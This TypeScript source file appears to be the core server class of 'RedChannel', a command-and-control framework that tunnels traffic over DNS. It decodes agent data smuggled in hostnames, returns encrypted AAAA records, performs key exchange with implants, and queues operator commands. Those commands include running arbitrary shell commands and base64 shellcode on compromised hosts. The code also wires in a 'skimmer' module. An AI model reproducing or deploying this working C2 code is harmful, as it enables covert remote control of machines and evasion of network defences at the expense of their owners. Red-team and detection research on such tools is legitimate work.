import * as crypto from "crypto";
import * as path from "path";
import ECKey from "ec-key";
import * as fs from "fs";
import _merge from "lodash.merge";

import { chunkString, Config, Constants, emsg, padZero } from "../utils";
import Crypto, { CipherModel, KeyExportType } from "./crypto";
import Logger from "./logger";
import SkimmerModule from "../modules/skimmer";
import StaticDnsModule from "../modules/static_dns";
import ImplantModule from "../modules/implant";
import ProxyModule from "../modules/proxy";

import * as implant from "../pb/implant";
import * as c2 from "../pb/c2";
import { DefaultConfig } from "./config";

/*
req: {
    connection: {
        remoteAddress: '127.0.0.1',
        type: 'AAAA'
    }
}
res: {
    question[0]: {
        type: 'AAAA',
        name: 'dns.query.tld'
    },
    answer: [],
    end: function(){}
}
*/
export enum C2AnswerType {
    TYPE_A = "A",
    TYPE_AAAA = "AAAA",
    TYPE_PROXY = "PROXY",
}
export type C2Answer = {
    name: string;
    type: C2AnswerType;
    data: string;
    ttl: number;
};
export type C2RequestConnection = {
    remoteAddress: string;
    type: C2AnswerType;
};
export type C2ResponseQuestion = {
    name: string;
    type: C2AnswerType;
};
export type C2MessageRequest = {
    connection: C2RequestConnection;
};
export type C2MessageResponse = {
    question: C2ResponseQuestion[];
    answer: C2Answer[];
    end: () => void;
};

export type AgentMessageSegments = {
    antiCacheValue: string;
    agentId: string;
    dataId: string;
    command: implant.AgentCommand;
    chunkNumber: number;
    totalChunks: number;
    chunk: string;
};

export type DataId = string;
export type DataChunk = string;
export type SendQEntry = string[];
export type AgentId = string;
export type AgentIdRandId = string;
export type RecvQMap = Map<DataId, DataChunk[]>;
export type AgentModel = {
    id: string;
    secret: Buffer;
    pubkey?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: c2.AgentChannel;
    allowKeyx?: boolean;
    sendq: SendQEntry[];
    // each agent has a map of dataId => chunks[]
    recvq: RecvQMap;
    sysinfo?: implant.SysInfoData;
};

export type RedChannelModules = {
    proxy: ProxyModule;
    implant: ImplantModule;
    static_dns: StaticDnsModule;
    skimmer: SkimmerModule;
};

// operators list
type OperatorHashedPassword = string;
export interface OperatorsList {
    [operator: string]: OperatorHashedPassword;
}

export default class RedChannel {
    version = Constants.VERSION;

    agents: Map<AgentId, AgentModel>;
    flood: Map<AgentIdRandId, NodeJS.Timeout>;

    hashedPassword: string;
    plaintextPassword: string;

    configFile: string;
    config: c2.RedChannelConfig;

    // the absolute path to the app directory
    appRoot: string = path.resolve("./");

    log: Logger;

    crypto: Crypto;

    modules: RedChannelModules;

    operators: OperatorsList = {};

    constructor(c2Password: string, configFile: string, initialConfig?: c2.RedChannelConfig) {
        this.log = new Logger();

        this.agents = new Map<AgentId, AgentModel>();

        this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;

        this.config = this.resetConfig(initialConfig ?? DefaultConfig);
        this.resetLogLevel();

        if (!this.config.c2?.domain) {
            throw new Error("Please specify the c2 domain via cli or config file");
        }

        this.plaintextPassword = c2Password;
        this.hashedPassword = crypto.createHash("sha256").update(c2Password).digest("hex");

        this.modules = {
            proxy: new ProxyModule(this.config, this.c2MessageHandler.bind(this), this.log),
            implant: new ImplantModule(this.config, this.hashedPassword, this.log),
            static_dns: new StaticDnsModule(this.config, this.log),
            skimmer: new SkimmerModule(this.config, this.log),
        };

        this.appRoot = __dirname;

        this.crypto = new Crypto();

        this.flood = new Map<AgentId, NodeJS.Timeout>();

        this.initOperators();

        this.modules.proxy.proxyInit();
    }

    // checks the c2.debug value and resets the log even accordingly
    resetLogLevel() {
        if (this.config.c2?.debug) {
            this.log.level = c2.LogLevel.DEBUG;
            return;
        }

        this.log.level = c2.LogLevel.INFO;
    }

    // creates the operators object and hashes their passwords
    initOperators() {
        if (!this.config.c2) throw new Error(`operators: c2 config is required`);

        for (const operator in this.config.c2.operators) {
            this.operators[operator] = crypto.createHash("sha256").update(this.config.c2.operators[operator]).digest("hex");
        }
    }

    verifyOperator(operator: string, hashedPassword: string): boolean {
        if (!operator || !hashedPassword.length) {
            this.log.error(`operator ${operator} failed to verify, invalid operator or password`);
            return false;
        }

        const operatorPasswordHash = this.operators[operator];
        if (!operatorPasswordHash?.length) {
            this.log.error(`operator ${operator} failed to verify, operator is unknown`);
            return false;
        }

        if (operatorPasswordHash !== hashedPassword) {
            this.log.error(`operator ${operator} failed to verify, password mismatch`);
            return false;
        }

        return true;
    }

    resetConfig(initialConfig: c2.RedChannelConfig) {
        let config = initialConfig;

        if (this.configFile) {
            let configInFile: c2.RedChannelConfig;
            try {
                configInFile = c2.RedChannelConfig.fromJsonString(fs.readFileSync(this.configFile).toString());
            } catch (ex) {
                throw new Error(`error parsing config file: ${emsg(ex)}`);
            }
            config = _merge(config, configInFile);
        }

        return config;
    }

    initAgent(agentId: string, channel: c2.AgentChannel, ip?: string) {
        if (!this.agents.has(agentId)) {
            this.agents.set(agentId, {
                id: agentId,
                secret: Buffer.from(""),
                lastseen: Math.floor(Date.now() / 1000),
                ip: ip,
                channel: channel,
                allowKeyx: false,
                sendq: [],
                recvq: new Map<DataId, DataChunk[]>(),
                sysinfo: implant.SysInfoData.create({}),
            });
        }
    }

    killAgent(agentId: string) {
        if (!this.agents.has(agentId)) throw new Error(`agent '${agentId}' does not exist`);

        this.agents.delete(agentId);
    }

    broadcastKeyx() {
        this.sendCommandKeyx();
    }

    sendAgentCommand(agentId: string, agentCommand: implant.AgentCommand, parameters?: string, implantConfig?: Partial<c2.ImplantModuleConfig>) {
        switch (agentCommand) {
            case implant.AgentCommand.SYSINFO:
                this.sendCommandSysinfo(agentId);
                break;
            case implant.AgentCommand.EXECUTE:
                if (!parameters?.length) throw new Error(`${implant.AgentCommand[implant.AgentCommand.EXECUTE]}: invalid command`);
                this.sendCommandShell(agentId, parameters);
                break;
            case implant.AgentCommand.EXECUTE_SHELLCODE:
                if (!parameters || !Constants.VALID_BASE64.test(parameters)) {
                    throw new Error(`${implant.AgentCommand[implant.AgentCommand.EXECUTE_SHELLCODE]}: invalid base64 shellcode`);
                }
                this.sendCommandExecShellcode(agentId, Buffer.from(parameters, "base64"));
                break;
            case implant.AgentCommand.KEYX:
                this.sendCommandKeyx(agentId);
                break;
            case implant.AgentCommand.SHUTDOWN:
                this.sendCommandShutdown(agentId);
                break;
            case implant.AgentCommand.SET_CONFIG:
                if (!implantConfig) throw new Error(`${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: invalid config`);
                this.sendCommandSetConfig(agentId, implantConfig);
                break;
            case implant.AgentCommand.MESSAGE:
                if (!parameters?.length) throw new Error(`${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: invalid message`);
                this.sendCommandMessage(agentId, parameters);
                break;
        }
    }

    /**
     * Send keyx to an agent or if no id broadcast it to all
     * @param agentId if null, we will broadcast keyx to all agents
     * @returns
     */
    sendCommandKeyx(agentId?: string) {
        if (!this.crypto.privateKey) {
            try {
                this.crypto.generateKeys();
            } catch (ex) {
                this.log.error(`failed to generate keys: ${emsg(ex)}`);
                return;
            }
        }

        const uncompressedPublicKey = this.crypto.exportPublicKey(KeyExportType.UNCOMPRESSED);
        if (!agentId) {
            // broadcast keyx if no agent is specified
            for (const id of this.agents.keys()) {
                this.queueData(id, implant.AgentCommand.KEYX, uncompressedPublicKey).catch((ex) => {
                    this.log.error(`error queueing data for agent(${id}) ${implant.AgentCommand[implant.AgentCommand.KEYX]}: ${emsg(ex)}`);
                });
            }
            this.log.info("broadcasting keyx");
            return;
        }

        this.queueData(agentId, implant.AgentCommand.KEYX, uncompressedPublicKey)
            .then(() => {
                this.log.warn(`keyx started with agent ${agentId}`);
            })
            .catch((ex) => {
                this.log.error(`error queueing data for agent(${agentId}): ${emsg(ex)}`);
            });
        return;
    }

    sendCommandMessage(agentId: string, message: string) {
        this.queueData(agentId, implant.AgentCommand.MESSAGE, Buffer.from(message)).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: ${emsg(ex)}`);
        });
    }

    sendCommandShell(agentId: string, shellCommand: string) {
        this.queueData(agentId, implant.AgentCommand.EXECUTE, Buffer.from(shellCommand)).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.EXECUTE]}: ${emsg(ex)}`);
        });
    }

    sendCommandExecShellcode(agentId: string, shellcode: Buffer) {
        this.queueData(agentId, implant.AgentCommand.EXECUTE_SHELLCODE, shellcode).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.EXECUTE_SHELLCODE]}: ${emsg(ex)}`);
        });
    }

    sendCommandShutdown(agentId: string) {
        const agent = this.getAgent(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);

        const secret = agent.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);

        // agent must be able to decrypt the tag to execute shutdown
        this.queueData(agentId, implant.AgentCommand.SHUTDOWN, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.SHUTDOWN]}: ${emsg(ex)}`);
        });
    }

    sendCommandSysinfo(agentId: string) {
        const agent = this.getAgent(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);

        const secret = agent.secret;
        if (!secret) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);

        // agent must be able to decrypt the tag to execute shutdown
        this.queueData(agentId, implant.AgentCommand.SYSINFO, this.encryptPayload(crypto.randomBytes(6), secret)).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}): ${emsg(ex)}`);
        });
    }

    sendCommandSetConfig(agentId: string, config: Partial<c2.ImplantModuleConfig>) {
        const configProto = implant.AgentConfig.create({});
        if (config.interval !== undefined) configProto.c2IntervalMs = { value: Number(config.interval) || this.config.implant?.interval || 5000 };
        if (config.throttleSendq !== undefined) configProto.throttleSendq = { value: Boolean(config.throttleSendq) };
        if (config.proxyEnabled !== undefined) configProto.useProxyChannel = { value: Boolean(config.proxyEnabled) };
        if (config.proxyKey !== undefined) configProto.proxyKey = { value: config.proxyKey };
        if (config.proxyUrl !== undefined) configProto.proxyUrl = { value: config.proxyUrl };

        const configProtoBuffer = Buffer.from(implant.AgentConfig.toBinary(configProto));
        // no need to send data, just the config proto
        this.queueData(agentId, implant.AgentCommand.SET_CONFIG, configProtoBuffer).catch((ex) => {
            this.log.error(`error queueing data for agent(${agentId}) ${implant.AgentCommand[implant.AgentCommand.SET_CONFIG]}: ${emsg(ex)}`);
        });
    }

    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    async queueData(agentId: string, command: implant.AgentCommand, data?: Buffer) {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);
        if (!agent.secret) throw new Error(`missing agent ${agentId} secret, do you need to 'keyx'?`);

        const commandProto = implant.Command_Request.create({
            command: command,
            data: data,
        });

        let commandProtoBuffer = Buffer.from(implant.Command_Request.toBinary(commandProto));

        // keyx commands are not encrypted
        if (command !== implant.AgentCommand.KEYX) {
            commandProtoBuffer = this.encryptPayload(commandProtoBuffer, agent.secret);
        }

        // this will be set to false after keyx is received and there are no more keyx in sendq
        if (command === implant.AgentCommand.KEYX) {
            agent.allowKeyx = true;
        }

        const dataString = commandProtoBuffer.toString("hex");
        const dataBlocks = chunkString(dataString, Config.DATA_BLOCK_STRING_LENGTH);

        const totalIps = Math.ceil(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP);
        const totalSendqEntries = Math.ceil(totalIps / Config.MAX_DATA_IPS_PER_SENDQ_ENTRY);

        const dataLength = dataString.length;
        const maxDataLength = Config.DATA_BLOCK_STRING_LENGTH * Config.MAX_DATA_BLOCKS_PER_IP * totalIps;
        const paddedBytesNeeded = (maxDataLength - dataLength) / 2;

        const dataId = crypto.randomBytes(2).toString("hex");

        for (let sendqEntryNum = 0; sendqEntryNum < totalSendqEntries; sendqEntryNum++) {
            let ips: string[] = [];
            // add sendq entry header
            // prettier-ignore
            ips.push(
                Config.IP_HEADER_PREFIX +
                ':' +
                dataId +
                ':' +
                padZero(command.toString(16), 2) +
                padZero(paddedBytesNeeded.toString(16), 2) +
                ':' +
                padZero(totalIps.toString(16), 4) +
                ':' +
                '0000:0000:0000:0001'
            );

            for (let ipNum = 0; ipNum < Config.MAX_DATA_IPS_PER_SENDQ_ENTRY; ipNum++) {
                let blocks = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);
                if (blocks.length === 0) break;

                // if we don't fill up the entire ip with data
                // it means we have to pad
                const maxBlockStringLength = Config.MAX_DATA_BLOCKS_PER_IP * Config.DATA_BLOCK_STRING_LENGTH;
                const blocksString = blocks.join("");
                if (blocksString.length < maxBlockStringLength) {
                    const blocksStringPadded = `${blocksString}${Config.DATA_PAD_HEXBYTE.repeat(paddedBytesNeeded)}`;
                    blocks = chunkString(blocksStringPadded, Config.DATA_BLOCK_STRING_LENGTH);
                }

                const recordNumber = ipNum + Config.MAX_DATA_IPS_PER_SENDQ_ENTRY * sendqEntryNum;
                // prettier-ignore
                ips.push(
                    Config.IP_DATA_PREFIX +
                    ':' +
                    padZero(recordNumber.toString(16), 4) +
                    ':' +
                    blocks.join(':')
                );
            }

            if (this.config.proxy?.enabled && agent.channel === c2.AgentChannel.PROXY) {
                await this.modules.proxy.sendToProxy(agent.id, ips);
            } else {
                agent.sendq.push(ips);
            }
            this.log.debug(`queued up ${ips.length} records: ${JSON.stringify(ips, null, 2)}`);
            ips = [];
        }
        this.log.debug(`added ${totalIps} records in ${totalSendqEntries} sendq entries for agent: ${agentId}`);
    }

    isCommandInSendQ(agentId: string, command: implant.AgentCommand) {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return;
        }

        const findCommand = padZero(command.toString(16), 2);
        let is = false;
        agent.sendq?.forEach((queue) => {
            if (queue[0].substring(0, 4) === Config.IP_HEADER_PREFIX) {
                if (queue[0].substring(12, 14) === findCommand) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    makeIpString(status: implant.C2ResponseStatus) {
        const lastByte = padZero(status.toString(16), 2);
        return `${Config.IP_HEADER_PREFIX}:0000:${padZero(implant.AgentCommand.IGNORE.toString(16), 2)}01:0000:0000:dead:c0de:00${lastByte}`;
    }

    /**
     * Make a string the cipher data and iv
     * @param {CipherModel} cipher A cipher object with IV and Data
     * @returns a hex string
     */
    makeEncryptedBufferStringHex(cipher: CipherModel) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    countDataChunks(chunks_array: string[]) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    getAgents() {
        return this.agents;
    }

    getAgent(agentId: string): AgentModel | null {
        return this.agents.get(agentId) || null;
    }

    parseAgentMessageSegments(hostname: string): AgentMessageSegments {
        if (!this.config.c2?.domain.length) throw new Error(`invalid c2 domain: ${this.config.c2?.domain}`);

        const segmentsArray = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
        if (segmentsArray.length < Config.EXPECTED_DATA_SEGMENTS) {
            throw new Error(`invalid message, not enough data segments (${segmentsArray.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
        }
        const segments: AgentMessageSegments = {
            antiCacheValue: "",
            agentId: "",
            dataId: "",
            command: implant.AgentCommand.UNSPECIFIED,
            chunkNumber: 0,
            totalChunks: 0,
            chunk: "",
        };

        // used to prevent flooding
        segments.antiCacheValue = segmentsArray[0];
        segments.agentId = segmentsArray[1];

        segments.dataId = segmentsArray[2];
        if (segments.dataId.length < 2) {
            throw new Error(`invalid data id: ${segments.dataId}`);
        }
        try {
            const commandInt = parseInt(segments.dataId.slice(-2), 16);
            if (!this.isValidCommand(commandInt)) {
                throw new Error(`unknown command from ${segments.agentId}: ${commandInt}, ignoring...`);
            }
            segments.command = <implant.AgentCommand>commandInt;
        } catch (ex) {
            throw new Error(`failed to parse command byte: ${emsg(ex)}`);
        }

        let chunkNumber: number;
        let totalChunks: number;
        try {
            chunkNumber = parseInt(segmentsArray[3].slice(0, 2), 16);
            totalChunks = parseInt(segmentsArray[3].slice(2, 4), 16);
            if (isNaN(chunkNumber) || isNaN(totalChunks)) throw new Error(`chunks are not properly numbered: current: ${chunkNumber}, total: ${totalChunks}`);
        } catch (ex) {
            throw new Error(`failed to parse chunk number and total chunks: ${emsg(ex)}`);
        }
        segments.chunkNumber = chunkNumber;
        segments.totalChunks = totalChunks;

        if (segments.chunkNumber > segments.totalChunks - 1) {
            throw new Error(`chunk number is out of bounds, current: ${segments.chunkNumber}, total: ${segments.totalChunks}`);
        }

        segments.chunk = segmentsArray[4];
        if (segments.chunk.length < 2) {
            throw new Error(`invalid chunk: ${segments.chunk}`);
        }

        return segments;
    }

    c2MessageHandler(req: C2MessageRequest, res: C2MessageResponse) {
        if (!this.config.c2?.domain.length) throw new Error(`invalid c2 domain: ${this.config.c2?.domain}`);

        const question = res.question[0];
        const hostname = question.name;
        const channel = question.type === "PROXY" ? c2.AgentChannel.PROXY : c2.AgentChannel.DNS;

        const staticDnsHostnameIp = this.config.staticDns[hostname];
        if (staticDnsHostnameIp) {
            this.log.info(`staticDns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
            res.answer.push({
                name: hostname,
                type: C2AnswerType.TYPE_A,
                data: staticDnsHostnameIp,
                ttl: Config.C2_ANSWER_TTL_SECS,
            });
            return res.end();
        }

        if (!hostname.endsWith(this.config.c2.domain)) {
            this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
            return res.end();
        }
        this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);

        if (question.type !== "AAAA" && question.type !== "PROXY") {
            // this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
            return res.end();
        }

        let segments: AgentMessageSegments | null = null;
        try {
            segments = this.parseAgentMessageSegments(hostname);
        } catch (ex) {
            this.log.error(`failed to parse message segments for ${hostname}: ${emsg(ex)}`);
        }
        if (!segments) {
            res.answer.push({
                name: hostname,
                type: C2AnswerType.TYPE_AAAA,
                data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_MESSAGE),
                ttl: Config.C2_ANSWER_TTL_SECS,
            });
            return res.end();
        }

        const agentId = segments.agentId;
        const agent = this.agents.get(agentId) as AgentModel;
        if (!agent) {
            this.initAgent(agentId, channel, req.connection.remoteAddress);
            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${c2.AgentChannel[channel]}`);
            const answers = this.processAgentFirstPing(agentId, hostname);
            if (answers) res.answer = res.answer.concat(answers);
            return res.end();
        }

        agent.lastseen = Math.floor(Date.now() / 1000);
        agent.ip = req.connection.remoteAddress;

        const dataId = segments.dataId;
        const command = segments.command;
        const floodId = agentId + segments.antiCacheValue;

        if (this.isAgentFlooding(floodId)) {
            // we have already responded to this agent and antiCacheValue combination
            this.log.warn(`ignoring flood from agent: ${agentId}, antiCache: ${segments.antiCacheValue}, dataId: ${dataId}`);
            return res.end();
        }

        // initialize the recvq for dataId
        if (!agent.recvq.has(dataId)) {
            agent.recvq.set(dataId, new Array(segments.totalChunks));
        }

        const recvqDataId = agent.recvq.get(dataId) as DataChunk[];
        recvqDataId[segments.chunkNumber] = segments.chunk;

        // count all data array entries, excluding undefined
        // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
        if (this.countDataChunks(recvqDataId) === segments.totalChunks) {
            const dataChunks = recvqDataId.join("");

            // process data, return answer records to send back
            res.answer = res.answer.concat(this.processAgentData(agentId, command, hostname, dataChunks));
            return res.end();
        }

        // we don't have all the chunks yet
        res.answer.push({
            name: hostname,
            type: C2AnswerType.TYPE_AAAA,
            data: this.makeIpString(implant.C2ResponseStatus.NEED_MORE_DATA),
            ttl: Config.C2_ANSWER_TTL_SECS,
        });

        /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
        }
        if (question.type == 'A') {
            res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
        }*/
        return res.end();
    }

    isValidCommand(command: number) {
        return Object.values(implant.AgentCommand).includes(command);
    }

    isAgentFlooding(floodId: string): boolean {
        if (this.flood.has(floodId)) {
            clearTimeout(this.flood.get(floodId));
            this.flood.set(
                floodId,
                setTimeout(() => {
                    this.flood.delete(floodId);
                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
            );
            return true;
        }

        // flood protection, if the agent dns resolver retries a query, data can be lost
        // so we ignore retries
        this.flood.set(
            floodId,
            setTimeout(() => {
                this.flood.delete(floodId);
            }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
        );
        return false;
    }

    processAgentFirstPing(agentId: string, hostname: string): C2Answer[] | void {
        try {
            this.sendCommandKeyx(agentId);
        } catch (ex) {
            this.log.error(`error sending keyx to agent ${agentId}: ${emsg(ex)}`);
        }

        // upon first ping, we don't have any keyx so we will not try to decrypt any data
        // grab the next in queue (which should be the keyx) and respond with it.
        let answers: C2Answer[] | void = [];
        try {
            answers = this.getNextQueuedCommand(agentId, hostname);
        } catch (ex) {
            this.log.error(`error getting next queued command for first keyx: ${emsg(ex)}`);
        }
        return answers;
    }

    checkInAgent(agent: AgentModel, hostname: string, data: string): C2Answer[] | void {
        const agentId = agent.id;

        let agentData = "";
        try {
            const agentCommandResponseProto = this.decryptAgentData(agentId, data);
            if (agentCommandResponseProto) {
                agentData = Buffer.from(agentCommandResponseProto.data).toString();
            } else {
                throw new Error(`invalid agent response proto`);
            }
        } catch (ex) {
            throw new Error(`cannot decrypt checkin from ${agentId}: ${emsg(ex)}`);
        }
        if (!agentData) {
            throw new Error(`agent response payload is invalid for ${agentId}`);
        }

        if (agent.sendq?.length === 0) {
            this.log.debug(`agent ${agent.id} checking in, no data to send`);
            return [
                {
                    name: hostname,
                    type: C2AnswerType.TYPE_AAAA,
                    data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
                    ttl: Config.C2_ANSWER_TTL_SECS,
                },
            ];
        }

        this.log.debug(`agent ${agent.id} checking in, sending next queued command`);
        const answers = this.getNextQueuedCommand(agent.id, hostname);
        return answers;
    }

    getNextQueuedCommand(agentId: string, hostname: string): C2Answer[] | void {
        const agent = this.agents.get(agentId);
        if (!agent) {
            throw new Error(`agent ${agentId} not found`);
        }

        const sendQItems = agent.sendq.shift() as SendQEntry;
        if (!sendQItems) return [];

        const answers: C2Answer[] = sendQItems.map((data) => ({
            name: hostname,
            type: C2AnswerType.TYPE_AAAA,
            data: data,
            ttl: Config.C2_ANSWER_TTL_SECS,
        }));
        return answers;
    }

    processAgentData(agentId: string, command: implant.AgentCommand, hostname: string, data: string): C2Answer[] {
        const agent = this.agents.get(agentId);
        if (!agent) {
            this.log.error(`agent ${agentId} not found`);
            return [
                {
                    name: hostname,
                    type: C2AnswerType.TYPE_AAAA,
                    data: this.makeIpString(implant.C2ResponseStatus.ERROR_AGENT_UNKNOWN),
                    ttl: Config.C2_ANSWER_TTL_SECS,
                },
            ];
        }

        switch (command) {
            // checkin should be authenticated (decrypt dummy data) or rogue agents can drain the queue for legitimate ones
            case implant.AgentCommand.CHECKIN: {
                let checkInAnswers: C2Answer[] | void = [];
                try {
                    checkInAnswers = this.checkInAgent(agent, hostname, data);
                } catch (ex) {
                    this.log.error(emsg(ex));
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_CHECKING_IN),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                if (checkInAnswers) return checkInAnswers;
                return [
                    {
                        name: hostname,
                        type: C2AnswerType.TYPE_AAAA,
                        data: this.makeIpString(implant.C2ResponseStatus.NO_DATA),
                        ttl: Config.C2_ANSWER_TTL_SECS,
                    },
                ];
                break;
            }
            case implant.AgentCommand.KEYX: {
                if (!agent.allowKeyx) {
                    this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_KEYX_NOT_ALLOWED),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }

                if (!this.crypto.privateKey) {
                    try {
                        this.crypto.generateKeys();
                    } catch (ex) {
                        this.log.error(`${emsg(ex)}`);
                        return [
                            {
                                name: hostname,
                                type: C2AnswerType.TYPE_AAAA,
                                data: this.makeIpString(implant.C2ResponseStatus.ERROR_GENERATING_KEYS),
                                ttl: Config.C2_ANSWER_TTL_SECS,
                            },
                        ];
                    }
                }

                try {
                    const agentPubkey = Buffer.from(data, "hex");
                    agent.pubkey = this.crypto.importUncompressedPublicKey(agentPubkey);
                } catch (ex) {
                    this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_IMPORTING_KEY),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.info(`agent(${agentId}) pubkey: ${agent.pubkey.asPublicECKey().toString("spki")}`);

                try {
                    agent.secret = this.crypto.deriveSecret(agent.pubkey, this.hashedPassword);
                } catch (ex) {
                    this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DERIVING_SECRET),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.info(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);

                // if there are no more queued up keyx's, ignore further keyxs from agent
                if (!this.isCommandInSendQ(agentId, implant.AgentCommand.KEYX)) agent.allowKeyx = false;
                break;
            }
            case implant.AgentCommand.MESSAGE: {
                let agentMessage = "";
                try {
                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
                    if (agentCommandResponseProto) agentMessage = Buffer.from(agentCommandResponseProto.data).toString();
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.log.info(`agent(${agentId}) output>\n ${agentMessage}`);
                break;
            }
            case implant.AgentCommand.SYSINFO: {
                let sysInfo: implant.SysInfoData = implant.SysInfoData.create({});
                try {
                    const agentCommandResponseProto = this.decryptAgentData(agentId, data);
                    if (agentCommandResponseProto?.data) {
                        sysInfo = implant.SysInfoData.fromBinary(agentCommandResponseProto.data);
                    }
                } catch (ex) {
                    this.log.error(`cannot decrypt sysinfo from ${agentId}: ${emsg(ex)}`);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_DECRYPTING_MESSAGE),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }

                if (!sysInfo.hostname) {
                    this.log.error(`agent(${agentId}) sent invalid sysinfo:`, sysInfo);
                    return [
                        {
                            name: hostname,
                            type: C2AnswerType.TYPE_AAAA,
                            data: this.makeIpString(implant.C2ResponseStatus.ERROR_INVALID_SYSINFO),
                            ttl: Config.C2_ANSWER_TTL_SECS,
                        },
                    ];
                }
                this.agents.set(agentId, { ...this.agents.get(agentId)!, sysinfo: sysInfo });
                this.log.info(`agent(${agentId}) sysinfo>`, sysInfo);
                break;
            }
        }
        return [
            {
                name: hostname,
                type: C2AnswerType.TYPE_AAAA,
                data: this.makeIpString(implant.C2ResponseStatus.DATA_RECEIVED),
                ttl: Config.C2_ANSWER_TTL_SECS,
            },
        ];
    }

    encryptPayload(data: Buffer, secret: Buffer): Buffer {
        const buffer = Buffer.from(data);
        const cipher = this.crypto.aesEncrypt(buffer, secret);
        return Buffer.concat([cipher.iv, cipher.data]);
    }

    decryptAgentData(agentId: string, data: string): implant.Command_Response | void {
        const agent = this.agents.get(agentId);
        if (!agent) throw new Error(`agent ${agentId} not found`);
        if (!data) throw new Error("invalid data");
        if (!agent.pubkey) throw new Error("missing agent pubkey");
        if (!agent.secret?.length) throw new Error(`missing agent ${agentId} secret, do you need to keyx?`);

        const dataBuffer = Buffer.from(data, "hex");
        const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
        const ciphertext = dataBuffer.slice(this.crypto.BLOCK_LENGTH);

        // may throw errors
        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);

        try {
            const commandProto = implant.Command_Response.fromBinary(plaintext);
            return commandProto;
        } catch (ex) {
            throw new Error(`failed to decode proto: ${emsg(ex)}`);
        }
    }
}
